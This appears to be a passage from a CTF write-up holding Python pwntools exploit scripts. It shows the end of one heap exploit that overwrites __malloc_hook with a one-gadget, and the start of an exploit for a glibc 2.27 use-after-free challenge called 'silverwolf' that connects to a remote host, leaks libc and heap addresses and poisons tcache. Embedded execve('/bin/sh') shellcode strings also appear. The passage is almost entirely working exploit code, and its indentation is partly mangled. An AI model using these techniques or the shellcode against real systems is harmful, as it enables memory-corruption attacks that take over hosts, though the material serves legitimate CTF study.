        ru("Result: ")
        data = int(r(12),16)
        bss = data - 8
        lg('bss',bss)
        str_jmp = addr - 0x7fb8da338000 + 0x7fb8da720360
        og = addr + 0x10a41c
        #------------------------------------------------        mh = addr + libc.sym['__malloc_hook']
        rh = addr +  libc.sym['realloc']
        off = (mh - bss - 0x60)/8
        off2 = (mh -bss - 0x60-8)/8
        # debug([0xB4C,0xBF6])
        a_write(off)
        s(p64(rh+4))
        lg('mh',mh)
        a_write(off2)
        s(p64(og))
        lg('og',og)
        sla("Your choice: ",'1'*0x500)
        # dbg()
    #     s(p64(0x00000000fbad2887))
    #     data = addr + 0x00007f0db0da97e3 - 0x7f0db09bd000
    #     for i in range(1,8):
    #         a_write(i)
    #         s(p64(data))
    #     a_write(8)
    #     s(p64(data+1))
    #     data2 = 0x00007f4deee96a00 + addr - 0x7f4deeaab000
    #     data3 = 0x00007f4deee988c0 + addr - 0x7f4deeaab000
    #     data4 = 0x00007f4deee968c0 + addr - 0x7f4deeaab000
    #     for i in range(4):
    #         a_write(9+i)
    #         s(p64(0))
    #     a_write(13)
    #     s(p64(data2))
    #     a_write(14)
    #     s(p64(1))
    #     a_write(15)
    #     s(p64(0xffffffffffffffff))
    #     a_write(16)
    #     s(p64(0x000000000a000000))
    #     a_write(17)
    #     s(p64(data3))
    #     a_write(18)
    #     s(p64(0xffffffffffffffff))
    #     a_write(19)
    #     s(p64(0))
    #     a_write(20)
    #     s(p64(data4))
    #     a_write(21)
    #     s(p64(0))
    #     a_write(22)
    #     s(p64(0))
    #     a_write(23)
    #     s(p64(0))
    #     a_write(24)
    #     s(p64(0x00000000ffffffff))    
    #     a_write(25)
    #     s(p64(0))
    #     a_write(26)
    #     s(p64(0))
    #     a_write(27)
    #     s(p64(str_jmp+8))
    # #--------------------------    #     a_write(0xffffffffffffffc0/8)
    #     s(p64(bss+0x60))
        it()
    if __name__ == '__main__':
        exp()
    #   │0x7f4deee97760 : 0x00000000fbad28870x00007f4deee977e3
    #   │0x7f4deee97770 :0x00007f4deee977e30x00007f4deee977e3
    #   │0x7f4deee97780 :0x00007f4deee977e30x00007f4deee977e3
    #   │0x7f4deee97790 :0x00007f4deee977e30x00007f4deee977e3
    #   │0x7f4deee977a0 :0x00007f4deee977e40x0000000000000000
    # │`│0x7f4deee977b0 :0x00000000000000000x0000000000000000
    # ··│0x7f4deee977c0 :0x00000000000000000x00007f4deee96a00
    # ·││0x7f4deee977d0 :   0x00000000000000010xffffffffffffffff
    # cU│0x7f4deee977e0 :   0x000000000a0000000x00007f4deee988c0
    # ··│0x7f4deee977f0 :   0xffffffffffffffff0x0000000000000000
    # │ │0x7f4deee97800 :   0x00007f4deee968c00x0000000000000000
    #   │0x7f4deee97810 :   0x00000000000000000x0000000000000000
    #   │0x7f4deee97820 :   0x00000000ffffffff0x0000000000000000
    # 00│0x7f4deee97830 :   0x00000000000000000x00007f4deee932a0
###  silverwolf
新版2.27 漏洞UAF
ORW
    # _*_ coding:utf-8 _*_
    from pwn import *
    context.log_level = 'debug'
    context.terminal=['tmux', 'splitw', '-h']
    prog = './silverwolf'
    #elf = ELF(prog)
    # p = process(prog)#,env={"LD_PRELOAD":"./libc-2.27.so"})
    libc = ELF("./libc-2.27.so")
    p = remote("124.71.227.203", 26158)
    def debug(addr,PIE=True): 
        debug_str = ""
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16) 
            for i in addr:
                debug_str+='b *{}\n'.format(hex(text_base+i))
            gdb.attach(p,debug_str) 
        else:
            for i in addr:
                debug_str+='b *{}\n'.format(hex(text_base+i))
            gdb.attach(p,debug_str) 
    def dbg():
        gdb.attach(p)
    #-----------------------------------------------------------------------------------------    s = lambda data :p.send(str(data))#in case that data is an int
    sa= lambda delim,data :p.sendafter(str(delim), str(data)) 
    sl= lambda data :p.sendline(str(data)) 
    sla = lambda delim,data :p.sendlineafter(str(delim), str(data)) 
    r = lambda numb=4096:p.recv(numb)
    ru= lambda delims, drop=True  :p.recvuntil(delims, drop)
    it= lambda:p.interactive()
    uu32= lambda data   :u32(data.ljust(4, '\0'))
    uu64= lambda data   :u64(data.ljust(8, '\0'))
    bp= lambda bkp:pdbg.bp(bkp)
    li= lambda str1,data1 :log.success(str1+'========>'+hex(data1))
    def dbgc(addr):
        gdb.attach(p,"b*" + hex(addr) +"\n c")
    def lg(s,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
    sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
    sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
    sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
    #https://www.exploit-db.com/shellcodes
    #-----------------------------------------------------------------------------------------    
    choice="Your choice: "
    def add(size,c='a'):  #
    ru(choice)
    sl('1')
    ru("Index: ")
    sl('0')
    ru("Size: ")
    sl(str(size))
    def delete():
    ru(choice)
    sl('4')
    ru("Index: ")
    sl('0')
    def edit(c):
    ru(choice)
    sl('2')
    ru("Index: ")
    sl('0')
    ru("Content: " )  
    sl(c)  
    def show():
    ru(choice)
    sl('3')
    ru("Index: ")
    sl('0')
    ru("Content: ")
    def exp():
        add(0x78)
        delete()
        # delete()
        # edit('wi1laaaaa')
        # delete()
        show()
        # ru("Content: ")
        data = uu64(r(6))
        heap = data - 0x260 - 0xf10
        lg('heap',heap)
        # #-----------------------------        # sla(choice,'1'*0x500)
        # add(0x50)
        # for i in range(7):
        #     add(0x60)
        # delete()
        edit(p64(heap+0x10))
        add(0x78)
        add(0x78)
        edit('\x07'*0x40)
        delete()
        show()
        data  = uu64(ru('\x7f',drop=False)[-6:])
        lg('data',data)
        addr = data -0x3ebca0
        free_hook=addr+libc.sym['__free_hook']
        sys_addr=addr+libc.sym['system']